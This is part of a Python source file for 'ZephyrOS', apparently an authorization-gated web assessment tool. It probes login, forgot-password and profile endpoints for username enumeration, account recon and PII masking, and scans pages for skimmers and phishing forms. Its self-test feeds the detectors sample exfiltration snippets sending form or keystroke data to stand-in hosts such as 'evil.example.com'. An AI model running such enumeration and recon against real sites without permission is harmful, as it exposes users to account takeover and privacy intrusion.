            detected = any(
                isinstance(v, dict)
                and v.get("verdict") == "shuffle_likely"
                for v in report.get("differential", {}).values())
        if tid == "k_anonymity":
            detected = (report.get("k_anonymity", {})
                              .get("verdict") == "k_anonymity_violation")
        if tid == "l_diversity":
            detected = (report.get("k_anonymity", {})
                              .get("l_diversity_entropy") is not None)
        if tid == "t_closeness":
            detected = (report.get("k_anonymity", {})
                              .get("t_closeness") is not None)
        if tid == "differential_privacy_noise":
            detected = any(
                v.get("verdict") == "numeric_noise"
                for v in report.get("repeated_read", {}).values())
        if tid == "quantile_binning":
            detected = any(
                "binning" in v.get("verdict", "")
                for v in report.get("binning", {}).values())
        if tid == "zkp_fingerprint":
            detected = ("zkp" in report.get("crypto_fingerprint", {})
                                          .get("schemes", {}))
        if tid == "homomorphic_fingerprint":
            detected = ("homomorphic"
                        in report.get("crypto_fingerprint", {})
                                  .get("schemes", {}))
        if tid == "smpc_fingerprint":
            detected = ("smpc" in report.get("crypto_fingerprint", {})
                                          .get("schemes", {}))
        if tid == "enumeration_login_diff":
            detected = (report.get("enumeration", {})
                              .get("findings", {})
                              .get("login_error_diff", {})
                              .get("verdict", "")
                        == "login_error_differs")
        if tid == "enumeration_forgot_password":
            detected = (report.get("enumeration", {})
                              .get("findings", {})
                              .get("forgot_password", {})
                              .get("verdict", "")
                        == "forgot_password_differs")
        if tid == "enumeration_check_endpoint":
            detected = (report.get("enumeration", {})
                              .get("findings", {})
                              .get("check_username", {})
                              .get("verdict", "")
                        == "check_endpoint_differs")
        if tid == "enumeration_public_profile":
            detected = (report.get("enumeration", {})
                              .get("findings", {})
                              .get("public_profile", {})
                              .get("verdict", "")
                        == "profile_differs")
        if tid == "client_js_obfuscation":
            detected = cs_enabled and bool(
                cs_js.get("per_script")
                or cs_js.get("control_flow_flattening")
                or cs_js.get("dead_vars"))
        if tid == "client_html_obfuscation":
            detected = cs_enabled and any(
                cs_html.get(k) for k in (
                    "data_uris", "js_uris", "meta_refresh", "comments"))
        if tid == "client_skimmer":
            detected = cs_enabled and any(
                h.get("verdict") == "HIGH" for h in cs_skimmer)
        if tid == "client_phishing":
            detected = cs_enabled and any(
                h.get("verdict") == "HIGH" for h in cs_phish)
        if tid == "account_recon":
            detected = bool(recon.get("public_endpoint")
                            or recon.get("id")
                            or recon.get("public_fields"))
        if tid == "login_field_required":
            detected = bool((lf.get("login") or {})
                            .get("fields_required"))
        if tid == "login_obfuscated_response":
            detected = bool((lf.get("login") or {}).get("obfuscated"))
        if tid == "forgot_password_obfuscated":
            detected = bool((lf.get("forgot_password") or {})
                            .get("obfuscated"))
        if tid == "account_visibility_public":
            detected = recon.get("visibility") == "public"
        if tid == "account_visibility_private":
            detected = recon.get("visibility") == "private"
        if tid == "account_id_type_numeric":
            detected = recon.get("id_shape") == "numeric"
        if tid == "account_id_type_alpha":
            detected = recon.get("id_shape") == "alpha"
        if tid == "account_id_type_mixed":
            detected = recon.get("id_shape") == "mixed"
        attempted = (tid in attempts or detected
                     or (cs_enabled and tid.startswith("client_"))
                     or (bool(recon) and tid.startswith("account_"))
                     or (bool(lf) and tid.startswith("login_")))
        contracts[tid] = {"name": name, "detected": detected,
                          "attempted": attempted}
    return contracts


class _FakeResp:
    status_code = 200
    headers = {"content-type": "application/json"}
    url = "http://test/x"
    encoding = "utf-8"
    reason = "OK"

    def close(self):
        pass

def self_test() -> int:
    checks: List[Tuple[str, bool]] = []

    def ck(name: str, cond: bool) -> None:
        checks.append((name, bool(cond)))

    ck("luhn_valid", IDChecksum.luhn("4532015112830366"))
    ck("luhn_invalid", not IDChecksum.luhn("4532015112830367"))
    ck("iban_valid", IDChecksum.iban("GB82WEST12345698765432"))
    ck("iban_invalid", not IDChecksum.iban("GB00WEST12345698765432"))

    r = try_base64("aGVsbG8=")
    ck("base64_hello", r is not None and r[1] == "hello")
    ck("url_decode",
       try_url("hello%20world") == ("URL-encoded", "hello world"))
    r = try_caesar("uryyb")
    ck("caesar_hello", r is not None and r[1] == "hello")
    ck("rot13_hello", try_rot13("uryyb") == ("ROT13", "hello"))
    ck("reverse", try_reverse("olleh") == ("Reversed", "hello"))
    ck("hex_decode", try_hex("68656c6c6f") == ("Hex", "hello"))

    ck("mask_skeleton_basic", mask_skeleton("jo***@x.com") == "VM3V")
    ck("has_no_mask_x", not has_mask("x0x0x0"))
    ck("has_mask_leak", has_mask_leak("see j***@x.com for details"))

    ck("leaf_extract_simple",
       extract_leaf_field_name("user.email") == "email")
    ck("leaf_extract_plural",
       extract_leaf_field_name("emails[0].address") == "email")
    ck("leaf_extract_id",
       extract_leaf_field_name("user.id") == "id")

    ck("detect_email",
       detect_identifier_type("john@example.com") == "email")
    ck("detect_phone_e164",
       detect_identifier_type("+15551234567") == "phone")
    ck("normalize_bd_hint",
       normalize_phone("01712345678", "BD") == "+8801712345678")

    ck("classify_id_numeric", classify_id_shape("12345") == "numeric")
    ck("classify_id_alpha", classify_id_shape("abcDEF") == "alpha")
    ck("classify_id_mixed", classify_id_shape("a1b2c3") == "mixed")

    ck("js_escape_unicode",
       decode_js_escapes("\\u0048\\u0069") == "Hi")
    ck("html_entity_hex",
       decode_html_entities("&#x48;&#105;") == "Hi")
    ck("atbash", decode_atbash("SVOOL") == "HELLO")

    cascade = StringCascade()
    out, trail = cascade.decode("SGVsbG8=")
    ck("cascade_base64", out == "Hello" and "base64" in trail)
    out, trail = cascade.decode("%48%65%6c%6c%6f")
    ck("cascade_url", out == "Hello" and "url" in trail)
    out, trail = cascade.decode("48656c6c6f")
    ck("cascade_hex", out == "Hello" and "hex" in trail)

    tv = TargetValidator()
    dns_res = tv.resolve("localhost")
    ck("target_validate_localhost",
       "localhost" == dns_res["host"]
       or dns_res["host"] == "localhost")

    ar = AccountRecon.__new__(AccountRecon)
    ar.identifier = make_identifier("john.doe")
    ar.username_field = "username"
    vis = ar.classify_visibility({"is_private": True, "id": 123})
    ck("visibility_private", vis["visibility"] == "private")
    vis = ar.classify_visibility({"is_public": True})
    ck("visibility_public", vis["visibility"] == "public")
    ident = ar.extract_public_id({"id": 98765, "name": "x"})
    ck("extract_id_numeric", ident["id_shape"] == "numeric")
    ident = ar.extract_public_id({"uuid": "abc-def-123"})
    ck("extract_id_mixed", ident["id_shape"] == "mixed")
    scraped = ar.scrape_profile(
        {"id": 1, "email": "j@x.com", "nested": {"phone": "+1"},
         "x": {"y": 1}})
    ck("scrape_counts", scraped["public_field_count"] >= 2)

    class _NS:
        pass

    def _make_fake_args(**overrides):
        a = _NS()
        a.i_have_written_authorization = True
        a.evaluate = None
        a.base_url = "https://lab.example.com"
        a.login_page = "https://lab.example.com/login"
        a.identifier = "john.doe"
        a.username = None
        a.email = None
        a.phone = None
        a.country_code = None
        a.password = None
        a.env = "lab"
        a.confirm_prod = False
        a.allow_plaintext = False
        a.login_url = ""
        a.profile_url = ""
        a.operator = "x"
        a.authorization_reference = "x"
        a.rate = 0.5
        a.known_name = ""
        a.known_email = ""
        a.known_phone = ""
        a.secondary_username = ""
        a.secondary_password = ""
        a.dictionary = ""
        a.training = ""
        a.timeout = 20
        a.repeat_reads = 5
        a.guard_tolerance = 1
        a.max_requests = 500
        a.insecure_tls = False
        a.allowed_hosts = ""
        a.scope_file = ""
        a.auth_header = []
        a.auth_token_file = ""
        a.username_field = ""
        a.password_field = ""
        a.secondary_username_field = ""
        a.secondary_password_field = ""
        a.report = "/tmp/r.json"
        a.include_pii = False
        a.redact_report = False
        a.no_enumeration = False
        a.json_out = False
        a.no_color = False
        a.dry_run = False
        a.quiet = False
        a.verbose = True
        a.resume = ""
        a.probe_auth_shape = False
        a.pause_only = False
        a.client_side = True
        a.client_out_dir = "zephyros_out"
        a.client_max_scripts = 20
        a.no_node = False
        a.no_pause = False
        a.account_recon = True
        for k, v in overrides.items():
            setattr(a, k, v)
        return a

    cfg = config_from_args(_make_fake_args())
    ck("pii_redacted_by_default", cfg["include_pii"] is False)
    ck("mode_enumeration_when_no_password",
       cfg["mode"] == "enumeration")
    ck("account_recon_enabled", cfg["account_recon"] is True)
    cfg = config_from_args(_make_fake_args(account_recon=False))
    ck("account_recon_disabled", cfg["account_recon"] is False)

    packed = ("eval(function(p,a,c,k,e,d){return p;}('abc',62,3,"
              "'|a|b|c'.split('|'),0,{}))")
    unpacked = PackerUnpackerPass().transform(packed)
    ck("packer_detected", "eval(function" not in unpacked
       or "|a|b|c" in unpacked)

    phishing = detect_phishing(
        '<form action="https://evil.example.com/steal" method="POST">'
        '<input type="password" name="p"></form>',
        "https://example.com/login")
    ck("phishing_off_origin",
       any(h["type"] == "form-action-off-origin" for h in phishing))

    skimmer = detect_skimmer_behavior(
        "document.addEventListener('keydown', e=>{});"
        "navigator.sendBeacon('https://evil/x', p);")
    ck("skimmer_exfil",
       any(h.get("pattern") in (
           "credential-exfil-flow", "keystroke-exfil-flow")
           for h in skimmer))

    ck("zephyr_author_present",
       "SYLHETYHACKVENGER" in ZEPHYR_AUTHOR)

    passed = sum(1 for _, c in checks if c)
    total = len(checks)
    for name, cond in checks:
        print(f"  [{'PASS' if cond else 'FAIL'}] {name}")
    print(f"\n{passed}/{total} checks passed")
    return EXIT_OK if passed == total else EXIT_ERROR


def main() -> int:
    global LOG
    parser = build_argparser()
    args = parser.parse_args()

    if args.self_test:
        return self_test()

    LOG = JsonLogger(quiet=args.quiet, verbose=args.verbose,
                     color=not args.no_color)

    if args.pause_only:
        target = args.login_page or args.base_url
        if not target:
            LOG.log("stop", msg="--pause-only requires --login-page "
                                "or --base-url")
            return EXIT_NO_TARGET
        try:
            target = normalize_base_url(target)
        except ValueError as e:
            LOG.log("stop", msg=str(e))
            return EXIT_NO_TARGET
        LOG.log("instrument", msg=f"target: {target}")
        paths = Instrumenter(target).write(args.client_out_dir)
        for label, p in paths.items():
            LOG.log("saved", msg=f"{label} -> {p}")
        LOG.log("instrument",
                msg=f"next: pip install playwright && "
                    f"python {paths['pause_runner']} {target} "
                    f"{paths['pause_js']}")
        return EXIT_OK

    if args.autopilot:
        try:
            config = autopilot_setup()
        except KeyboardInterrupt:
            print()
            return EXIT_INTERRUPT
        config["authorized"] = True
    elif args.interactive or len(sys.argv) == 1:
        try:
            config = interactive_setup()
        except KeyboardInterrupt:
            print()
            return EXIT_INTERRUPT
        config["authorized"] = True
    else:
        config = config_from_args(args)
        config["authorized"] = args.i_have_written_authorization

    dictionary = load_dictionary(config["dictionary_path"])
    word_priors = load_word_priors(config.get("word_priors"))
    training_pairs = load_training_pairs(config["training_path"])
    if config.get("resume"):
        extra_pairs = load_training_pairs(config["resume"])
        if extra_pairs:
            training_pairs = training_pairs + extra_pairs
            LOG.log("resume",
                    msg=f"loaded {len(extra_pairs)} resume pairs")
    model = CandidateModel(dictionary=dictionary,
                           word_priors=word_priors)
    analyzer = MaskPatternAnalyzer(
        dictionary=dictionary, training_pairs=training_pairs, model=model)

    if config.get("eval_path"):
        eval_pairs = load_training_pairs(config["eval_path"])
        LOG.log("eval_start", msg=f"evaluating {len(eval_pairs)} pairs")
        result = evaluate_harness(
            eval_pairs, analyzer, model,
            use_known=bool(getattr(args, "eval_with_known", False)))
        print(json.dumps(result, indent=2))
        return EXIT_OK

    classifier = ObfuscationTechniqueClassifier()
    plausibility = SemanticPlausibility(dictionary)

    identifier: Identifier = config["identifier"]
    password: str = config.get("password", "") or ""
    mode: str = config.get("mode") or (
        "authenticated" if password else "enumeration")

    LOG.log("mode",
            msg=f"identifier={identifier.type} mode={mode} "
                f"env={config['env']} "
                f"client_side={config.get('client_side')} "
                f"account_recon={config.get('account_recon')}")

    known_values = {
        "name": config.get("known_name", ""),
        "full_name": config.get("known_name", ""),
        "fullname": config.get("known_name", ""),
        "display_name": config.get("known_name", ""),
        "username": (config.get("known_name", "") or
                     (identifier.normalized
                      if identifier.type == "username" else "")),
        "email": (config.get("known_email", "") or
                  (identifier.normalized
                   if identifier.type == "email" else "")),
        "phone": (config.get("known_phone", "") or
                  (identifier.e164 or ""
                   if identifier.type == "phone" else "")),
        "mobile": (config.get("known_phone", "") or
                   (identifier.e164 or ""
                    if identifier.type == "phone" else "")),
        "number": (config.get("known_phone", "") or
                   (identifier.e164 or ""
                    if identifier.type == "phone" else "")),
    }

    scope = load_scope_file(config.get("scope_file", ""))
    allowed_hosts = list(config.get("allowed_hosts") or [])
    if scope.get("hosts"):
        allowed_hosts.extend(scope["hosts"])
    if not allowed_hosts:
        allowed_hosts = [urlparse(config["base_url"]).netloc.lower()]

    auth_headers = dict(config.get("auth_headers") or {})
    if config.get("auth_token_file"):
        try:
            with open(config["auth_token_file"], "r",
                      encoding="utf-8") as fh:
                auth_headers["Authorization"] = (
                    "Bearer " + fh.read().strip())
        except OSError as e:
            LOG.log("warn", msg=f"token file load failed: {e}")

    try:
        client = AuthorizedClient(
            base_url=config["base_url"],
            requests_per_second=config["rate"],
            timeout=config["timeout"],
            verify_tls=not config["insecure_tls"],
            authorized=config["authorized"],
            auth_headers=auth_headers,
            allowed_hosts=allowed_hosts,
            max_requests=config["max_requests"],
            guard_tolerance=config["guard_tolerance"],
        )
    except (ValueError, AuthorizationRequiredError) as e:
        LOG.log("error", msg=str(e))
        return EXIT_AUTH_REFUSED

    state = {"interrupted": False}
    prev_handlers = install_signal_handlers(state)

    report: Dict[str, Any] = {
        "tool": "ZephyrOS",
        "tool_version": VERSION,
        "zephyr_author": ZEPHYR_AUTHOR,
        "generated_at": utcnow(),
        "mode": mode,
        "identifier": identifier.to_dict(),
        "operator": config.get("operator", "unknown"),
        "authorization_reference": config.get("auth_ref", "unspecified"),
        "env": config.get("env", "lab"),
        "target": config.get("base_url", ""),
        "login_page": config.get("login_page", ""),
        "user_agent": AuthorizedClient._user_agent(),
        "dependencies": dependency_versions(),
        "scope_hosts": allowed_hosts,
        "request_budget": config["max_requests"],
        "guard_tolerance": config["guard_tolerance"],
        "dictionary_size": len(dictionary),
        "word_prior_count": len(word_priors),
        "training_pair_count": len(training_pairs),
        "learned_rule_count": len(analyzer.learned_rules),
        "pii_included": bool(config.get("include_pii", False)),
        "enumeration_enabled": bool(config.get("enumeration", True)),
        "client_side_enabled": bool(config.get("client_side", True)),
        "account_recon_enabled": bool(config.get("account_recon", True)),
        "techniques_attempted": [],
        "techniques_not_attempted": [],
        "log": [],
        "status": "running",
        "resume_used": bool(config.get("resume")),
    }

    def finish(reason: str,
               exc: Optional[BaseException] = None) -> int:
        report["status"] = reason
        report["log"] = LOG.dump()
        report["log_sha256"] = LOG.sha256()
        report["request_count"] = client.request_count
        report["soft_guard_count"] = client.soft_guard_count
        report["hard_guard_count"] = client.hard_guard_count
        report["guard_hits"] = [h for h in client.guard_hits
                                if not h.get("soft")]
        report["soft_guard_hits"] = [h for h in client.guard_hits
                                     if h.get("soft")]
        report["technique_contracts"] = build_technique_contracts(report)
        if exc is not None:
            report["exception"] = {
                "type": type(exc).__name__,
                "msg": str(exc),
                "trace_tail": traceback.format_exc()[-3000:]}
        payload = report
        if not config.get("include_pii", False):
            payload = redact_sensitive_values(report)
        save_report(config["report_path"], payload)
        if config.get("json_out"):
            print(json.dumps(payload, indent=2, ensure_ascii=False))
        return {"ok": EXIT_OK, "guard": EXIT_GUARD,
                "auth_refused": EXIT_AUTH_REFUSED,
                "scope": EXIT_SCOPE, "interrupt": EXIT_INTERRUPT,
                "error": EXIT_ERROR}[reason]

    try:
        LOG.log("target",
                msg="step 1: validating target "
                    "(IP v4/v6, domain, subdomain)")
        tv = TargetValidator()
        try:
            target_info = tv.validate(config["base_url"])
        except Exception as e:
            target_info = {"error": f"{type(e).__name__}: {e}"}
            LOG.log("warn",
                    msg=f"target validation error: {e}")
        report["target_info"] = target_info
        LOG.log("target",
                msg=f"reachable={target_info.get('reachable')} "
                    f"ipv4={target_info.get('dns', {}).get('ipv4', [])} "
                    f"ipv6={target_info.get('dns', {}).get('ipv6', [])} "
                    f"domain={target_info.get('dns', {}).get('domain')} "
                    f"subdomain={target_info.get('dns', {}).get('subdomain')}")

        if config.get("client_side", True):
            LOG.log("client_side",
                    msg="step 2: client-side deobfuscation")
            try:
                cs_result = run_client_side_analysis(
                    client=client,
                    target_url=config.get("login_page")
                    or config["base_url"],
                    out_dir=config["client_out_dir"],
                    max_scripts=config.get("client_max_scripts", 20),
                    node_enabled=not config.get("no_node", False),
                    generate_pause=config.get("generate_pause", True),
                )
                report["client_side"] = cs_result
                if cs_result.get("skimmer_hits"):
                    report["techniques_attempted"].append(
                        "client_skimmer")
                if cs_result.get("phishing_hits"):
                    report["techniques_attempted"].append(
                        "client_phishing")
                report["techniques_attempted"].extend([
                    "client_js_obfuscation",
                    "client_html_obfuscation"])
            except (GuardTriggeredError, ScopeViolationError) as e:
                LOG.log("warn", msg=f"client-side aborted: {e}")
                report["client_side"] = {
                    "enabled": True, "error": str(e)}
            except Exception as e:
                LOG.log("warn",
                        msg=f"client-side error: {type(e).__name__}: {e}")
                report["client_side"] = {
                    "enabled": True,
                    "error": f"{type(e).__name__}: {e}"}
        else:
            report["client_side"] = {"enabled": False}

        LOG.log("discover_start", msg="step 3: fetching robots.txt")
        robots = fetch_robots(client)
        if robots:
            report["robots_txt_sha256"] = hashlib.sha256(
                robots.encode()).hexdigest()

        LOG.log("discover_start", msg="probing openapi")
        openapi = probe_openapi(client)
        if openapi:
            report["openapi_detected"] = True
            report["openapi_paths"] = list(
                (openapi.get("paths") or {}).keys())[:50]

        discovered_uf, discovered_pf = discover_login_fields(openapi)
        username_field = (config.get("username_field")
                         or identifier_field_name(
                             identifier, openapi, ""))
        password_field = (config.get("password_field")
                          or discovered_pf)
        login_url = config.get("login_url") or "/api/login"
        report["login_url"] = urljoin(config["base_url"], login_url)
        report["login_fields"] = {"identifier_field": username_field,
                                  "password_field": password_field}

        if config.get("account_recon", True):
            LOG.log("recon",
                    msg="step 4: account recon "
                        "(public profile + id + visibility)")
            try:
                recon = AccountRecon(
                    client=client, identifier=identifier,
                    login_url=login_url,
                    username_field=username_field)
                recon_result = recon.run()
                report["account_recon"] = recon_result
                report["techniques_attempted"].append("account_recon")
                if recon_result.get("visibility") == "public":
                    report["techniques_attempted"].append(
                        "account_visibility_public")
                elif recon_result.get("visibility") == "private":
                    report["techniques_attempted"].append(
                        "account_visibility_private")
                shape = recon_result.get("id_shape")
                if shape in ("numeric", "alpha", "mixed"):
                    report["techniques_attempted"].append(
                        f"account_id_type_{shape}")
            except (GuardTriggeredError, ScopeViolationError) as e:
                LOG.log("warn", msg=f"account recon aborted: {e}")
                report["account_recon"] = {"error": str(e)}
            except Exception as e:
                LOG.log("warn",
                        msg=f"account recon error: "
                            f"{type(e).__name__}: {e}")
                report["account_recon"] = {
                    "error": f"{type(e).__name__}: {e}"}
        else:
            report["account_recon"] = {"enabled": False}

        LOG.log("login_probe",
                msg="step 5-6: probing login endpoint "
                    "(wrong password)")
        login_flow_result: Optional[Dict[str, Any]] = None
        try:
            lfp = LoginFlowProber(
                client=client, identifier=identifier,
                login_url=login_url,
                username_field=username_field,
                password_field=password_field)
            login_flow_result = lfp.run()
            report["login_flow"] = login_flow_result
            if (login_flow_result.get("login") or {}) \
                    .get("fields_required"):
                report["techniques_attempted"].append(
                    "login_field_required")
            if (login_flow_result.get("login") or {}).get("obfuscated"):
                report["techniques_attempted"].append(
                    "login_obfuscated_response")
            if (login_flow_result.get("forgot_password") or {}) \
                    .get("obfuscated"):
                report["techniques_attempted"].append(
                    "forgot_password_obfuscated")
        except (GuardTriggeredError, ScopeViolationError) as e:
            LOG.log("warn", msg=f"login flow aborted: {e}")
            report["login_flow"] = {"error": str(e)}
        except Exception as e:
            LOG.log("warn",
                    msg=f"login flow error: {type(e).__name__}: {e}")
            report["login_flow"] = {
                "error": f"{type(e).__name__}: {e}"}

        if mode == "authenticated":
            if config.get("probe_auth_shape"):
                LOG.log("auth_shape",
                        msg="probing login error shape")
                try:
                    r = client.post_json(login_url, {}, soft=True)
                    if r is not None:
                        body_bytes = r.content or b""
                        report["auth_shape_probe"] = {
                            "status": r.status_code,
                            "body_sha256_16": hashlib.sha256(
                                body_bytes[:200]).hexdigest()[:16],
                            "body_len": len(body_bytes)}
                except (GuardTriggeredError, ScopeViolationError,
                        LabToolError, requests.RequestException):
                    pass
            try:
                login_result = login(
                    client=client, login_url=login_url,
                    username=identifier.raw, password=password,
                    username_field=username_field,
                    password_field=password_field)
                report["login"] = login_result
            except AuthRefusedError as e:
                LOG.log("auth_failed", msg=str(e))
                report["login"] = {
                    "status": "auth_refused",
                    "error_sha256_16": hashlib.sha256(
                        str(e).encode()).hexdigest()[:16]}
                mode = "enumeration"
                report["mode"] = mode

            if mode == "authenticated":
                profile_path = config.get("profile_url")
                if not profile_path:
                    LOG.log("discover_start",
                            msg="probing profile endpoint")
                    profile_path = discover_profile_path(client, openapi)
                if profile_path:
                    report["profile_url"] = urljoin(
                        config["base_url"], profile_path)
                    LOG.log("profile_start", msg=f"GET {profile_path}")
                    try:
                        primary, _ = fetch_json(client, profile_path)
                        report["primary_profile_sha256"] = \
                            hashlib.sha256(json.dumps(
                                primary, sort_keys=True).encode()
                            ).hexdigest()
                        repeated = []
                        if config["repeat_reads"] > 1:
                            LOG.log("repeat_start",
                                    msg=f"fetching profile "
                                        f"{config['repeat_reads']}x")
                            repeated = fetch_repeated(
                                client, profile_path,
                                config["repeat_reads"])
                        findings = analyze_profile(
                            profile_data=primary, analyzer=analyzer,
                            classifier=classifier,
                            known_values=known_values,
                            plausibility=plausibility)
                        report["profile_findings"] = [
                            f.to_dict() for f in findings]
                        for f in findings:
                            LOG.log("finding",
                                    msg=f"{f.field} -> "
                                        f"{f.classification.technique} "
                                        f"({f.classification.confidence:.2f})")
                        noise_reports: Dict[str, Any] = {}
                        if len(repeated) >= 3:
                            flat_reads = [flatten_json(r)
                                          for r in repeated]
                            keys = set().union(
                                *[set(r.keys()) for r in flat_reads])
                            for key in keys:
                                vals = [r.get(key) for r in flat_reads]
                                if all(v is None for v in vals):
                                    continue
                                rep = RepeatedReadAnalyzer(
                                    vals).analyze()
                                if rep:
                                    noise_reports[key] = rep
                        report["repeated_read"] = noise_reports
                        binning_reports: Dict[str, Any] = {}
                        if repeated:
                            flat_reads = [flatten_json(r)
                                          for r in repeated]
                            keys = set().union(
                                *[set(r.keys()) for r in flat_reads])
                            for key in keys:
                                nums = []
                                for r in flat_reads:
                                    v = r.get(key)
                                    if v is None:
                                        continue
                                    try:
                                        nums.append(float(v))
                                    except (TypeError, ValueError):
                                        nums = []
                                        break
                                if len(nums) >= 5:
                                    rep = BinningAnalyzer(
                                        nums).analyze()
                                    if rep:
                                        binning_reports[key] = rep
                        report["binning"] = binning_reports
                        crypto_fp = fingerprint_response(
                            primary, profile_path)
                        if crypto_fp:
                            report["crypto_fingerprint"] = crypto_fp
                        report["access_control"] = \
                            validate_unauthenticated_access(
                                client, profile_path)
                        report["techniques_attempted"].extend([
                            "partial_masking",
                            "format_preserving_masking",
                            "fixed_width_padding_masking",
                            "full_redaction",
                            "tokenization_or_pseudonymization",
                            "generalization_or_binning",
                            "character_scrambling_or_generative",
                            "differential_privacy_noise (repeated-read)",
                            "quantile_binning (numeric)",
                            "zkp_fingerprint (passive)",
                            "homomorphic_fingerprint (passive)",
                            "smpc_fingerprint (passive)"])
                    except (LabToolError, GuardTriggeredError,
                            ScopeViolationError) as e:
                        LOG.log("warn",
                                msg=f"profile fetch/analysis failed: {e}")
                        report["profile_findings"] = []
                else:
                    LOG.log("warn",
                            msg="profile endpoint not discovered; "
                                "skipping authenticated analysis")
                    report["profile_findings"] = []
        else:
            report["profile_findings"] = []

        if config.get("enumeration", True) and not config.get("dry_run"):
            LOG.log("enum_start",
                    msg="step 7: enumeration probes")
            safe_only = (mode == "authenticated")
            enum = EnumerationAnalyzer(
                client=client, identifier=identifier,
                login_url=login_url, username_field=username_field,
                password_field=password_field, safe_only=safe_only)
            report["enumeration"] = enum.analyze()
            report["techniques_attempted"].extend([
                "enumeration_login_diff",
                "enumeration_forgot_password",
                "enumeration_check_endpoint",
                "enumeration_public_profile"])
        else:
            report["techniques_not_attempted"].extend([
                "enumeration_login_diff (disabled)",
                "enumeration_forgot_password (disabled)"])

        if config.get("dry_run"):
            report["dry_run"] = True
            profile_path = config.get("profile_url") or "/api/me"
            report["access_control"] = validate_unauthenticated_access(
                client, profile_path)
            return finish("ok")

        LOG.log("done", msg="scan complete")
        return finish("ok")

    except GuardTriggeredError as e:
        LOG.log("stop", msg=str(e))
        return finish("guard", e)
    except ScopeViolationError as e:
        LOG.log("stop", msg=str(e))
        return finish("scope", e)
    except AuthRefusedError as e:
        LOG.log("stop", msg=str(e))
        return finish("auth_refused", e)
    except KeyboardInterrupt:
        LOG.log("stop", msg="interrupted")
        return finish("interrupt")
    except LabToolError as e:
        LOG.log("error", msg=str(e))
        return finish("error", e)
    except Exception as e:
        LOG.log("error", msg=f"unexpected: {e}")
        return finish("error", e)
    finally:
        restore_signal_handlers(prev_handlers)


if __name__ == "__main__":
    sys.exit(main())
